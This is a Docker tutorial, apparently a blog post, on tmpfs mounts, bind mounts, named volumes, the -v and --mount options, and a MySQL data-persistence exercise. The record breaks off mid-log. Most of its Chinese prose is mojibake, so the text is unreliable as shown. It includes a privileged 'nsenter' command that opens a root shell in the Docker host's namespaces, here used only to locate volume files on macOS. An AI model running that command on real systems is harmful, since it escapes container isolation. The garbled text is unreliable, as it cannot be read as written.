[{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå‰è¨€ åœ¨é è¨­çš„ Docker daemon ä¸‹ï¼Œæˆ‘å€‘å¸¸æœƒé‡åˆ°å¹¾ç¨®æƒ…æ³ï¼š\nç•¶è©²å®¹å™¨ä¸å†å­˜åœ¨æ™‚ï¼Œæ•¸æ“šå°‡ä¸æœƒæŒä¹…ä¿å­˜ï¼Œä¸¦ä¸”å¦‚æœå¦ä¸€å€‹ Process éœ€è¦å®ƒï¼Œå‰‡å¯èƒ½å¾ˆé›£å¾å®¹å™¨ä¸­å–å‡ºæ•¸æ“šã€‚ å®¹å™¨çš„å¯å¯«å±¤èˆ‡é‹è¡Œå®¹å™¨çš„ä¸»æ©Ÿç·Šå¯†è€¦åˆã€‚æ‚¨ä¸èƒ½è¼•æ˜“åœ°å°‡æ•¸æ“šç§»å‹•åˆ°å…¶ä»–åœ°æ–¹ã€‚ å¯«å…¥å®¹å™¨çš„å¯å¯«å±¤éœ€è¦ å­˜å„²é©…å‹•ç¨‹åºä¾†ç®¡ç†æ–‡ä»¶ç³»çµ±ã€‚å­˜å„²é©…å‹•ç¨‹åºä½¿ç”¨ Linux å…§æ ¸æä¾›è¯åˆæ–‡ä»¶ç³»çµ±ã€‚èˆ‡ä½¿ç”¨ç›´æ¥å¯«å…¥ä¸»æ©Ÿæ–‡ä»¶ç³»çµ±çš„æ•¸æ“šå·ç›¸æ¯”ï¼Œé€™ç¨®é¡å¤–çš„æŠ½è±¡é™ä½äº†æ€§èƒ½ã€‚ Container æ˜¯åœ¨ Image ä¹‹ä¸Šå»å‰µå»ºçš„ï¼ŒContainer å¯ä»¥è®€å¯«æ•¸æ“šï¼Œè€Œ Image åªèƒ½å¤ è®€å–ï¼Œä½†æ˜¯ Container è£¡é¢æ‰€å¯«å…¥çš„æ•¸æ“šï¼Œåªæœƒå­˜åœ¨ Container è£¡é¢ï¼Œå¦‚æœåˆªé™¤ Containerï¼Œå¯«å…¥çš„æ•¸æ“šæœƒå…¨éƒ¨æ¶ˆå¤±ã€‚æœ‰ä¸€ç¨®éœ€æ±‚ï¼Œè³‡æ–™åº«çš„ Container æœƒæœ‰æ•¸æ“šçš„è®€å¯«ï¼Œåœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼ŒDocker å°±éœ€è¦æ•¸æ“šæŒä¹…åŒ–ã€‚\nç‚ºäº†è§£æ±ºé€™äº›å•é¡Œå°±èª•ç”Ÿäº† Docker Volumeã€‚\nContainer è£¡é¢æœƒæœ‰ä¸€å€‹ Programï¼ŒæŠŠæª”æ¡ˆå¯«å…¥ File Systemï¼Œé€™äº›æª”æ¡ˆæœƒå­˜åœ¨ Container çš„ Layer ä¸­ï¼Œæˆ‘å€‘æŠŠæ•¸æ“šçš„éƒ¨åˆ†ï¼Œé¡å¤– Mount ä¸€å€‹ Volumeï¼Œé€™æ¨£ä¸€ä¾†ï¼Œæ•¸æ“šå°±æœƒè¢«æ°¸ä¹…ä¿å­˜ï¼›æ¯å€‹ Container éƒ½æ˜¯ç¨ç«‹ä¸”å°é–‰çš„ï¼Œä½†æœ‰æ™‚å€™æˆ‘å€‘æœƒæƒ³è¦ä¸é€éé€²å…¥ Container å°±èƒ½æ”¹è®Šå…§éƒ¨çš„ç¨‹å¼ç¢¼ï¼Œæˆ–è€…æ˜¯æƒ³è¦é€²è¡Œ Database å‡ç´šä¸¦ä¿ç•™åŸæœ¬è³‡æ–™ï¼Œé€™æ™‚å°±éœ€è¦Docker Volume äº†ã€‚\nDocker æŒä¹…åŒ–æ•¸æ“šçš„æ–¹æ¡ˆï¼š\nåŸºæ–¼æœ¬åœ°æ–‡ä»¶ç³»çµ±çš„ Volumeï¼šå¯ä»¥åœ¨åŸ·è¡Œ docker create æˆ–æ˜¯ docker run çš„æ™‚ï¼Œé€šé -v åƒæ•¸å°‡ä¸»æ©Ÿç›®éŒ„ä½œç‚º Container çš„ Volumeï¼Œé€™éƒ¨åˆ†åŠŸèƒ½ä¾¿æ˜¯åŸºæ–¼æœ¬åœ°ç³»çµ±çš„ Volume ç®¡ç†ã€‚ åŸºæ–¼å¤–æ›çš„ Volumeï¼šæ”¯æŒç¬¬ä¸‰æ–¹çš„å„²å­˜æ–¹æ¡ˆï¼Œä¾‹å¦‚ï¼šAWSã€‚ è«‡åˆ° Docker å®¹å™¨çš„è³‡æ–™å„²å­˜(storage)å•é¡Œï¼ŒåŸºæœ¬ç›´è¦ºå°±æ˜¯é€éæ›è¼‰ Volumesï¼Œä¸é Docker çš„ Volumes å…¶å¯¦æœ‰ 3 ç¨®ä¸åŒé¡å‹(types)ï¼š\ntmpfsMountï¼šä¸»æ©Ÿçš„ memoryã€‚ BindMountï¼šå¯ä»¥ç‚ºä¸»æ©Ÿè·¯å¾‘ä¸‹ä»»ä½•åœ°æ–¹ã€‚ Volumeï¼šContainer å°‡ Volume å­˜æ”¾åœ¨ Docker areaï¼Œä»¥ Linux ä¾†èªªé è¨­ç‚º /var/lib/docker/volumeã€‚ å¤§å®¶å¸¸ç”¨çš„ -v \u0026lt;Host è·¯å¾‘\u0026gt;:\u0026lt;Container è·¯å¾‘\u0026gt; åƒæ•¸å…¶å¯¦å°±æ˜¯ä½¿ç”¨ BindMountï¼Œä¾‹å¦‚ä»¥ä¸‹æŒ‡ä»¤ï¼š\n1 docker run -it -v /home/user:/data debian /bin/bash ç°¡è€Œè¨€ä¹‹ï¼Œä½¿ç”¨ BindMount çš„ volume å…¶å¯¦å°±æ˜¯é€é host machine çš„æª”æ¡ˆç³»çµ±(filesystem)æä¾›å®¹å™¨å„²å­˜çš„èƒ½åŠ›ã€‚\ntmpfsMount ä¸åŒæ–¼ Volumeã€BindMoundï¼ŒtmpfsMount ä¸éœ€è¦å¯¦é«”è·¯å¾‘å°‡è³‡æ–™å„²å­˜ï¼Œä»–æ˜¯æš«æ™‚æ€§åœ°å„²å­˜åœ¨ä¸»æ©Ÿçš„è¨˜æ†¶é«”ç•¶ä¸­ï¼Œç•¶ Container åœæ­¢æ™‚ï¼Œå°±æœƒç§»é™¤è³‡æ–™ï¼Œé€šå¸¸ç”¨ä¾†å„²å­˜æš«å­˜æ€§è³‡æ–™ä»¥åŠæ•æ„Ÿè³‡æ–™ã€‚\nå¦‚ä½•ä½¿ç”¨ tmpfsMountï¼Ÿ 1 docker run --name \u0026lt;ContainerName\u0026gt; -d --mount type=tmpfs,destination=\u0026lt;å…§éƒ¨è·¯å¾‘\u0026gt; -p 8100:8100 \u0026lt;ImageName\u0026gt; èˆ‰å€‹ä¾‹å­ï¼š\n1 docker run --name \u0026lt;ContainerName\u0026gt; -d --tmpfs \u0026lt;å…§éƒ¨è·¯å¾‘\u0026gt; -p 8100:8100 \u0026lt;ImageName\u0026gt; BindMount BindMount å°±æ˜¯åšæ˜ å°„ docker run -v /home/aaa:/root/aaaï¼Œå¯ä»¥å°‡æœ¬åœ°ç›®éŒ„å’Œ Container ç›®éŒ„åšæ˜ å°„ï¼Œå¦‚æœæœ¬åœ°ç›®éŒ„ä¿®æ”¹ï¼ŒContainer çš„æ•¸æ“šå…§å®¹ä¹Ÿæœƒä¿®æ”¹ï¼Œåä¹‹äº¦ç„¶ã€‚\nå¦‚ä½•ä½¿ç”¨ BindMountï¼Ÿ èˆŠç‰ˆæœ¬ Window ç‰ˆçš„å‘\nwindow ç‰ˆä¸èƒ½ç›´æ¥æ›è¼‰ï¼Œè¦å…ˆèª¿ä¸€ä¸‹è¨­å®šã€‚\né¸æ“‡è¦æ›è¼‰çš„ç›®éŒ„ æ‰“é–‹ Docker Desktop General \u0026gt; share dirve æ›è¼‰ç›¸æ‡‰è·¯å¾‘ï¼Œè©²è·¯å¾‘åº•ä¸‹çš„è³‡æ–™å¤¾æ‰èƒ½è¢«æ›è¼‰ æ–°ç‰ˆæœ¬ window desktop å¯ä»¥ç›´æ¥æ›è¼‰ï¼ŒæŒ‡ä»¤ï¼š\n1 docker run -v \u0026lt;å¤–éƒ¨çµ•å°è·¯å¾‘\u0026gt;:\u0026lt;å…§éƒ¨è·¯å¾‘\u0026gt; \u0026lt;ImageName\u0026gt; èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘åœ¨ windows é›»è…¦ //e/program/Wayne/DockerExample åº•ä¸‹æ”¾äº† index.htmlï¼Œè¦æ˜ å°„çµ¦ /usr/local/apache2/htdocsï¼š\n1 docker run -it -d --name Web_Vol -p 8081:80 -v //e/program/Wayne/DockerExample:/usr/local/apache2/htdocs httpd:2.4 ç¾åœ¨åœ¨å¤–éƒ¨ä¿®æ”¹å°±èƒ½ç›´æ¥å½±éŸ¿åˆ° Container å…§éƒ¨äº†ã€‚\nç•¶ä½¿ç”¨ -v åœ¨æ›è¼‰è·¯å¾‘æ™‚ï¼Œè‹¥è©²è·¯å¾‘ä¸å­˜åœ¨æ–¼æœ¬æ©Ÿï¼Œå‰‡æœƒå»ºç«‹è©²è·¯å¾‘ï¼Œå¦‚æœå°‡ç¶å®šåˆ°å®¹å™¨ä¸Šçš„ç›®éŒ„ä¸ç‚ºç©ºï¼Œé‚£ç›®éŒ„ç¾æœ‰çš„å…§å®¹æœƒè¢«ç¶å®šçš„ç›®éŒ„çµ¦é®è“‹ã€‚\nVolume Volume çš„å„ªé» å‰æ–‡ç°¡å–®ä»‹ç´¹ BindMount å¾Œï¼Œæ¥è‘—ä¾†èªè­˜ Docker å®˜æ–¹æ›´ç‚ºæ¨è–¦çš„ Volume å§ã€‚\nVolume èˆ‡ BindMount æœ€å¤§çš„ä¸åŒåœ¨æ–¼ Volume æ˜¯ç”± Docker å…¨æ¬Šé€²è¡Œç®¡ç†ï¼Œå› æ­¤ Volume æ¯”èµ· BindMount æœ‰å¹¾å€‹å„ªé»ï¼š\nVolumes æ›´å¥½è½‰ç§»(migration)èˆ‡å‚™ä»½(backup)ã€‚ Volumes èƒ½å¤ é€é Docker API èˆ‡ Docker CLI é€²è¡Œç®¡ç†èˆ‡æ“ä½œã€‚ Volumes å¯è·¨å¹³å°(Linux, Windows)ã€‚ Volumes åœ¨ macOS èˆ‡ Windows ä¸Šæ•ˆèƒ½è¡¨ç¾è¼ƒå¥½ã€‚ Volumes æ›´åŠ é©åˆå¤šå€‹å®¹å™¨(Container)å…±äº«ä½¿ç”¨çš„æƒ…å¢ƒã€‚ Volumes æä¾›æ•´åˆé ç«¯æˆ–é›²ç«¯å„²å­˜æœå‹™çš„èƒ½åŠ›ï¼ˆè©³è¦‹ Docker pluginï¼‰ï¼Œåªè¦ä½¿ç”¨ä¸åŒçš„ Volume driver å³å¯ï¼Œä¾‹å¦‚å¯ä»¥å®‰è£ vieux/sshfs plugin æ›è¼‰é ç«¯ SSH ä¼ºæœå™¨çš„æª”æ¡ˆç³»çµ±ã€‚ åŸºæœ¬ä¸Šï¼Œå¦‚æœä½ ä¸çŸ¥é“ç”¨ Volume æ¯”è¼ƒå¥½é‚„æ˜¯ BindMount æ¯”è¼ƒå¥½ï¼Œä½¿ç”¨ Volume å°±å°äº†ï¼\nMySQL Docker file è£¡é¢æœ‰ä¸€è¡Œï¼ŒVOLUME /var/lib/mysql å°±æ˜¯å°‡æ•¸æ“šå­˜åˆ°è™›æ“¬ä¸»æ©Ÿçš„ç›®éŒ„ï¼Œå¯¦ç¾æ•¸æ“šæŒä¹…åŒ–ï¼Œè®“æ•¸æ“šä¸æœƒå› ç‚º Container æ¶ˆå¤±è€Œæ¶ˆå¤±ã€‚\nå¦‚ä½•ä½¿ç”¨ Volumesï¼Ÿ -v or --mount\nå‰µå»ºä¸€å€‹ Volume 1 docker volume create \u0026lt;VolumeName\u0026gt; å¯ä»¥ç”¨ -d ä¾†æŒ‡å®šä½ç½®\n1 docker volume create \u0026lt;VolumeName\u0026gt; -d \u0026lt;å¤–éƒ¨çµ•å°è·¯å¾‘\u0026gt; è¦æ˜¯ä¸ -d æŒ‡å®šç‰¹å®šç©ºé–“ï¼Œç³»çµ±æœƒè‡ªå‹•å¹«ä½ ç”Ÿæˆç©ºé–“ï¼Œç„¶è€Œå…·é«”æœƒåœ¨é›»è…¦çš„å“ªè£¡å‘¢ï¼Ÿ\nWindows ç‰ˆæœƒåœ¨ \\\\wsl$\\docker-desktop-data\\version-pack-data\\community\\docker\\volumes\nLinux ç‰ˆæœƒåœ¨ /var/lib/docker/volumes/\nå•Ÿå‹• Container ä¸¦æ›è¼‰ Volume åˆ°æŒ‡å®šè·¯å¾‘ 1 docker run --name \u0026lt;ContainerName\u0026gt; -d -v \u0026lt;å¤–éƒ¨çµ•å°è·¯å¾‘\u0026gt;:\u0026lt;å…§éƒ¨è·¯å¾‘\u0026gt; -p 8100:8100 \u0026lt;ImageName\u0026gt; èˆ‰å€‹ä¾‹å­ï¼š\n1 docker run -it -v myvolume:/data nginx /bin/bash é€²åˆ°å®¹å™¨å…§å°±å¯ä»¥ç™¼ç¾è·¯å¾‘ /data å¯ä»¥ä½¿ç”¨ï¼š\n1 2 3 4 5 6 root@1630d3b4ffb8:~# touch /data/hello.txt root@1630d3b4ffb8:~# ls -alh /data total 8.0K drwxr-xr-x 2 root root 4.0K Mar 18 15:53 . drwxr-xr-x 1 root root 4.0K Mar 18 15:51 .. -rw-r--r-- 1 root root 0 Mar 18 15:53 hello.txt å¦‚æœæœ‰åœ¨ Volume å…§æ–°å¢ä»»ä½•è³‡æ–™çš„è©±ï¼Œä¹Ÿå¯ä»¥åœ¨ Docker Desktop å…§çœ‹åˆ°ï¼š\nå‰æ–‡æåŠ Volume å¯ä»¥å…±äº«ï¼Œå› æ­¤å¯ä»¥æ‰“é–‹ä¸€å€‹æ–°çš„å®¹å™¨ä¸¦ä¸”æ›è¼‰åŒä¸€å€‹ Volume è©¦è©¦ï¼š\n1 2 3 $ docker run -it -v myvolume:/data debian /bin/bash root@12fa2630f490:/# ls /data hello.txt ä¸Šè¿°çµæœå¯ä»¥çœ‹åˆ°æ–°å•Ÿå‹•çš„å®¹å™¨å…§ä¸åƒ…æœ‰ /data è³‡æ–™å¤¾ï¼Œè©²è³‡æ–™å¤¾åº•ä¸‹ä¹Ÿæœ‰å…ˆå‰åœ¨å…¶ä»–å®¹å™¨å»ºç«‹çš„æª”æ¡ˆã€‚\nè‹¥æƒ³åˆ—å‡ºæ‰€æœ‰ Volumes 1 docker volume ls è‹¥æƒ³æŸ¥çœ‹ Volume è©³ç´°è³‡è¨Š 1 2 3 4 5 6 7 8 9 10 11 12 13 docker volume inspect \u0026lt;VolumeName\u0026gt; [ { \u0026#34;CreatedAt\u0026#34;: \u0026#34;2022-03-13T06:48:16Z\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Labels\u0026#34;: {}, \u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/myvolume/_data\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;myvolume\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34; } ] ä¸Šè¿°æŒ‡ä»¤çµæœå¯ä»¥çœ‹åˆ° Mountpointï¼Œè©²è³‡è¨Šå°±æ˜¯ Volume å¯¦éš›å„²å­˜è³‡æ–™çš„è·¯å¾‘ä½ç½®ã€‚\nä½†å¦‚æœæ˜¯ macOS çš„ä½¿ç”¨è€…å°±æœƒç™¼ç¾æ‰¾ä¸åˆ° /var/lib/docker/ (no such file or directory: /var/lib/docker)ï¼š\n1 2 3 $ cd /var/lib/docker/volumes/ cd: no such file or directory: /var/lib/docker/volumes/ é€™æ˜¯ç”±æ–¼ macOS çš„ Docker æ˜¯ç”¨ LinuxKit æ¨¡æ“¬çš„ï¼Œå› æ­¤è·¯å¾‘åˆè¢«åŒ…è£éä¸€å±¤ï¼Œå…¶å¤§è‡´åœ¨ä»¥ä¸‹çš„è·¯å¾‘ï¼š\n1 $ cd ~/Library/Containers/com.docker.docker/Data/vms/0/ å¯æ–¼ä¸Šè¿°è³‡æ–™å¤¾å…§ç™¼ç¾ 1 å€‹åç¨±ç‚º tty çš„æª”æ¡ˆï¼Œç”¨æŒ‡ä»¤ screen tty å°±èƒ½å¤ é€²å…¥ LinuxKit å…§ï¼Œç„¶å¾Œå°±èƒ½ç™¼ç¾ /var/lib/docker/volumes è³‡æ–™å¤¾ï¼Œç„¶å¾Œå°±èƒ½é †åˆ©æ‰¾åˆ°ç›¸å°æ‡‰çš„ Volume å›‰ï¼\nä¸é Docker Desktop for Mac version 2.3.0.4 ä»¥å¾Œå°±æ²’æœ‰ tty æª”æ¡ˆäº†ï¼Œä½†é‚„æ˜¯å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤é€²å…¥ Docker çš„ host machine ä¸¦ä¸”æ‰¾åˆ° /var/lib/docker/volumesï¼š\n1 docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh 1 ls /var/lib/docker/volumes/ è‹¥æƒ³ç§»é™¤ Volume 1 docker volume rm \u0026lt;VolumeName\u0026gt; Volume çš„ 2 ç¨®åƒæ•¸ æ›è¼‰ Volume æ™‚ï¼Œé™¤äº† -v åƒæ•¸å¯ä»¥ä½¿ç”¨ä¹‹å¤–ï¼Œé‚„æœ‰ --mount åƒæ•¸å¯ä»¥ä½¿ç”¨ï¼ŒåŸºæœ¬ä¸Š 2 è€…åŠŸèƒ½æ˜¯ç›¸åŒçš„ï¼Œä½†å·®åˆ¥åœ¨æ–¼åƒæ•¸æ ¼å¼ä¸ä¸€æ¨£ä¹‹å¤–ï¼Œ --mount å¯è¨­å®šçš„é¸é …ä¹Ÿç›¸è¼ƒå¤šä¸€é»ã€‚\n-v åƒæ•¸ -v çš„åƒæ•¸å€¼æ˜¯ä»¥ : åšç‚ºåˆ†éš”çš„ 3 å€‹æ¬„ä½å€¼ï¼Œåˆ†åˆ¥æ˜¯ \u0026lt;Volumeåç¨±\u0026gt;:\u0026lt;å®¹å™¨å…§çš„æ›è¼‰è·¯å¾‘\u0026gt;:\u0026lt;Volumeé¸é …\u0026gt;ã€‚\n\u0026lt;Volumeåç¨±\u0026gt;ï¼š å¯ä»¥æ˜¯ Docker çš„ Volume åç¨±ï¼Œè©²åç¨±å¯ä»¥ç”¨æŒ‡ä»¤ docker volume ls åˆ—å‡ºï¼Œå…¶å€¼å°æ‡‰çš„æ˜¯ VOLUME NAME ä¸€æ¬„ã€‚å¦‚æœé€™é‚Šç”¨çš„æ˜¯å¯¦éš›ç³»çµ±è·¯å¾‘çš„è©±ï¼ŒDocker å°±æœƒè‡ªå‹•è½‰ç‚ºä½¿ç”¨ bind mountï¼Œè€Œé Volumeã€‚ \u0026lt;å®¹å™¨å…§çš„æ›è¼‰è·¯å¾‘\u0026gt;ï¼š å®¹å™¨(Container)å…§çš„è·¯å¾‘ã€‚ \u0026lt;Volumeé¸é …\u0026gt; ä¾‹å¦‚ ro ä»£è¡¨å”¯è®€(read only)ã€‚ ä¾‹å¦‚æ›è¼‰å”¯è®€(read only)çš„ Volumeï¼š\n1 docker run -it -v myvolume:/data:ro debian /bin/bash \u0026ndash;mount åƒæ•¸ --mount åƒæ•¸å‰‡å¯ä»¥è¦–ç‚º -v åƒæ•¸çš„é€²éšç‰ˆã€‚\n--mount æ›´åŠ å£èª(verbose)åŒ–ï¼Œåœ¨ Volumes çš„è¨­å®šä¸Šéƒ½æœƒæ˜ç¢ºä»¥ \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; çš„å½¢å¼é€²è¡Œè¨­å®šï¼ˆç•¶ \u0026lt;key\u0026gt; ç‚º readonly æ™‚ï¼Œå¯ä»¥ç›´æ¥çœç•¥ =\u0026lt;value\u0026gt; çš„éƒ¨åˆ†ï¼‰ï¼Œå¤šå€‹ key å€¼ä¹‹é–“å‰‡ä»¥é€—è™Ÿ(,)é€²è¡Œåˆ†å‰²ï¼Œè€Œä¸”è¨­å®šçš„é †åºä¸Šä¸¦ä¸åƒ -v åƒæ•¸é‚£èˆ¬æœ‰é †åºä¸Šçš„è¦æ±‚ã€‚\nç›®å‰å¯ä½¿ç”¨çš„ \u0026lt;key\u0026gt; å€¼æœ‰ï¼š\nsource destination type readonly volume-driver volume-opt source\nsource æ˜¯æ¬²æ›è¼‰ Volume çš„åç¨±ï¼Œè©²åç¨±å¯ä»¥ç”¨æŒ‡ä»¤ docker volume ls åˆ—å‡ºï¼Œå…¶å€¼å°æ‡‰çš„æ˜¯ VOLUME NAME ä¸€æ¬„ã€‚\ndestination\ndestination æ˜¯å®¹å™¨(Container)å…§æ›è¼‰ Volume å…§çš„è·¯å¾‘ã€‚\ntype\nå…¶å€¼å¯ä»¥æ˜¯ bindã€volumeã€tmpfs å…¶ä¸­ 1 å€‹ï¼Œä¸€èˆ¬ä½¿ç”¨ volume å³å¯ï¼Œæ˜¯ Docker æ¨è–¦çš„æ–¹å¼ï¼›å¦‚æœä½¿ç”¨ bind å‰‡ä»£è¡¨ä½¿ç”¨ bind mountsï¼›æœ€å¾Œ 1 ç¨® tmpfs å‰‡ä»£è¡¨ tmpfs mountï¼Œé€šå¸¸ tmpfs ç”¨ä»¥å„²å­˜éæŒä¹…æ€§(non-persistent)çš„è³‡æ–™ï¼Œä¾‹å¦‚æš«å­˜æª”æ¡ˆã€å¿«å–(cache)ç­‰ç­‰ï¼Œä¹Ÿå¯ç”¨ä»¥æå‡å®¹å™¨çš„æ•ˆèƒ½ï¼Œä¹Ÿç”±æ–¼ tmpfs æ˜¯éæŒä¹…æ€§(non-persistent)çš„å„²å­˜ï¼Œæ‰€ä»¥ç•¶å®¹å™¨(container)é—œé–‰å¾Œï¼Œè©² volume å…§çš„è³‡æ–™ä¹Ÿæœƒè·Ÿè‘—æ¶ˆå¤±ã€‚\nIf your container generates non-persistent state data, consider using a tmpfs mount to avoid storing the data anywhere permanently, and to increase the containerâ€™s performance by avoiding writing into the containerâ€™s writable layer.\nå»ºç«‹ä¸€å€‹ tmpfs çš„ Volume æŒ‡ä»¤å¦‚ä¸‹ï¼š\n1 docker volume create -o type=tmpfs -o device=tmpfs \u0026lt;VolumeName\u0026gt; ä¾‹å¦‚ä»¥ä¸‹æŒ‡ä»¤å»ºç«‹ 1 å€‹åç‚º mytmpfs çš„ tmpfs volumeï¼š\n1 docker volume create -o type=tmpfs -o device=tmpfs mytmpfs é™¤äº†æ–°å¢ Volume å¾Œæ›è¼‰ tmpfs volume ä¹‹å¤–ï¼Œç•¶ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ä»¥ --mount åƒæ•¸æ–¹å¼æ›è¼‰ tmpfs volumeï¼š\n1 docker run -it --mount type=tmpfs,destination=/data debian /bin/bash ä¸Šè¿°æŒ‡ä»¤å…¶å¯¦ç­‰åŒæ–¼ï¼Œ Docker ä¹Ÿæœ‰æä¾› --tmpfs åƒæ•¸å¯ä»¥ä½¿ç”¨ï¼š\n1 docker run -it --tmpfs /data debian /bin/bash readonly\nå°‡ Volume è¨­å®šç‚ºå”¯è®€(read only)ã€‚ç­‰åŒæ–¼ -v åƒæ•¸ä¸­çš„ ro é¸é …ã€‚\nä»¥ --mount åƒæ•¸æ›è¼‰å”¯è®€ Volume çš„ç¯„ä¾‹ï¼š\n1 docker run -it --mount source=myvolume,destination=/data,readonly debian /bin/bash volume-driver\nDocker å°‡å„²å­˜(storage)çš„æ¦‚å¿µæŠ½è±¡åŒ–ç‚º driver (æˆ–ç¨±é©…å‹•å™¨)ï¼Œé€éä½¿ç”¨ä¸åŒçš„ driver å¯ä»¥ä»‹æ¥å„å¼å„æ¨£çš„æª”æ¡ˆç³»çµ±ï¼Œä¾‹å¦‚ NFS(Network File System)ã€SSHFS(SSH Filesystem) ç”šè‡³æ˜¯ AWS S3 ç­‰ç­‰ï¼Œé è¨­æ˜¯ä½¿ç”¨ local driverï¼Œä¹Ÿå°±æ˜¯ volume-driver=localã€‚\nå¦‚æœæƒ³ä½¿ç”¨å…¶ä»– driver å¯ä»¥æŸ¥çœ‹ä»¥ä¸‹æ–‡ä»¶ï¼š\nDocker volume plugins æˆ– Available volume plugins Docker engine managed plugin system é€™äº›æ–‡ä»¶åˆ—å‡ºç¬¬ä¸‰æ–¹æä¾›çš„å„ç¨® Volume plugin çš„å®‰è£èˆ‡ä½¿ç”¨æ–¹å¼ä¹‹å¤–ï¼Œä¹Ÿç´€éŒ„å¦‚ä½•ä½¿ç”¨ Docker å®˜æ–¹æä¾›çš„æŒ‡ä»¤(docker plugin install \u0026lt;pluginName\u0026gt;)å®‰è£ Volume plugin ä»¥åŠ Volume plugin çš„é–‹ç™¼æ–¹æ³•ã€‚\nvolume-opt\nvolume-opt ç”¨ä»¥è¨­å®š Volume ç›¸é—œçš„é¸é …ï¼Œvolume-opt çš„æ•¸é‡ä¸¦æ²’æœ‰é™åˆ¶ï¼Œç«¯çœ‹ volume driver æä¾›å“ªäº›é¸é …å¯ä»¥ä½¿ç”¨ï¼Œè©³ç´°èƒ½å¤ ä½¿ç”¨çš„é¸é …å¯ä»¥åƒè€ƒ FILESYSTEM-SPECIFIC MOUNT OPTIONS ç« ç¯€ã€‚\nå€¼å¾—æ³¨æ„çš„æ˜¯ tmpfs ä¸¦ä¸æ”¯æ´ volume-opt çš„ç”¨æ³•ï¼Œå¦‚æœ 2 è€…åˆç”¨å°±æœƒå‡ºç¾ä»¥ä¸‹éŒ¯èª¤ï¼š\n1 cannot mix \u0026#39;volume-*\u0026#39; options with mount type \u0026#39;tmpfs\u0026#39; ç·´ç¿’ï¼š ç”¨ Docker è·‘ MySQL ç›®æ¨™ å¸Œæœ› Database åœ¨ Container åˆªé™¤å¾Œï¼Œé‚„èƒ½ç•™ä¸‹ä¾†è¢«æ–°å»ºç«‹çš„ Container é‡æ–°ä½¿ç”¨ï¼Œä¸æœƒä¸€èµ·æ¶ˆå¤±ä¸è¦‹ã€‚\næ–¹æ³•ä¸€ (ç¶²è·¯æŸ¥æ‰¾çš„æ¨™æº–æ­¥é©Ÿ) å»ºç«‹å­˜æ”¾ MySQL /var/lib/mysql è³‡æ–™åº«æª”æ¡ˆçš„ Persistent Volumeï¼Œå‘½åç‚º mysql-dataã€‚ 1 docker create -v /var/lib/mysql --name mysql-data mysql:5.7.18 ä»¥å‰›å»ºç«‹å‡ºä¾†çš„ Volume mysql-data ä½œç‚º storage æŠŠ MySQL runner è·‘èµ·ä¾†ã€‚ æŒ‡å®š MySQL ç‰ˆæœ¬ç‚º 5.7.18ã€‚ è¨­å®š MYSQL_RANDOM_ROOT_PASSWORD=yes ç’°å¢ƒè®Šæ•¸ï¼Œè®“ MySQL Docker è‡ªå‹•ç”¢ç”Ÿ MySQL root å¸³è™Ÿçš„äº‚æ•¸å¯†ç¢¼ã€‚ å‘½åç‚º mysql-runnerã€‚ æŒ‡ä»¤å¦‚ä¸‹ï¼š\n1 2 3 docker run -p 3306:3306 -v /var/lib/mysql --volumes-from mysql-data --name mysql-runner -d -e MYSQL_RANDOM_ROOT_PASSWORD=yes mysql:5.7.18 \u0026gt; d746048e41b7 ä»¥ Container ID æŸ¥è©¢ log æ‰¾åˆ° MySQL è‡ªå‹•å»ºç«‹çš„äº‚æ•¸å¯†ç¢¼ã€‚ 1 2 3 4 5 6 docker logs d746048e41b7 \u0026gt; Initializing database \u0026gt; ... \u0026gt; GENERATED ROOT PASSWORD: Aethov1phae2Ju5B \u0026gt; ... å†èµ·ä¸€å€‹è‡¨æ™‚ Container é–‹ shell è·‘ mysql-clientï¼Œé…åˆäº‚æ•¸å¯†ç¢¼é€£é€² mysql-runner çš„ MySQL serverï¼Œç”¨å®Œå³ä¸Ÿã€‚ 1 docker run -it --link mysql-runner:mysql --rm mysql sh -c \u0026#39;exec mysql -h \u0026#34;$MYSQL_PORT_3306_TCP_ADDR\u0026#34; -P \u0026#34;$MYSQL_PORT_3306_TCP_PORT\u0026#34; -u root -p \u0026#34;Aethov1phae2Ju5B\u0026#34;\u0026#39; ä¹Ÿå¯ä»¥ç”¨ docker inspect æ‰¾åˆ° mysql-runner Container çš„ IPï¼Œå¾ host é€£é€²å»ã€‚\n1 mysql -h 172.17.0.20 -u root -P 3306 -p Aethov1phae2Ju5B æ–¹æ³•äºŒ (è‡ªè¡Œå¯¦é©—çš„æ­¥é©Ÿéç¨‹) ç¬¬ 1 ~ 9 æ­¥é©Ÿçš†æ–¼è‡ªè¡Œæ¸¬è©¦éšæ®µï¼Œå¯ç›´æ¥è·³åˆ°ç¬¬ 10 æ­¥é©Ÿã€‚\nå‰µå»ºä¸€å€‹ MySQL çš„ Containerï¼Œä¸¦ä½¿ç”¨æ²’æœ‰å¯†ç¢¼çš„ç’°å¢ƒè®Šæ•¸ã€‚ 1 docker run -d --name mysql1 -e MYSQL_ALLOW_EMPTY_PASSWORD mysql é€™æ™‚å€™ç”¨ docker ps æŸ¥çœ‹ Container æœƒç™¼ç¾ mysql1 æ²’æœ‰å•Ÿå‹•æˆåŠŸï¼Œä½¿ç”¨ docker logs mysql1 æŸ¥çœ‹ï¼Œå°±æœƒé¡¯ç¤ºè¦æŒ‡å®š MYSQL_ROOT_PASSWORDã€‚ 1 2 3 4 5 6 7 docker logs mysql1 \u0026gt; 2020-03-01 02:36:05+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.19-1debian9 started. \u0026gt; 2020-03-01 02:36:05+00:00 [Note] [Entrypoint]: Switching to dedicated user \u0026#39;mysql\u0026#39; \u0026gt; 2020-03-01 02:36:05+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.19-1debian9 started. \u0026gt; 2020-03-01 02:36:06+00:00 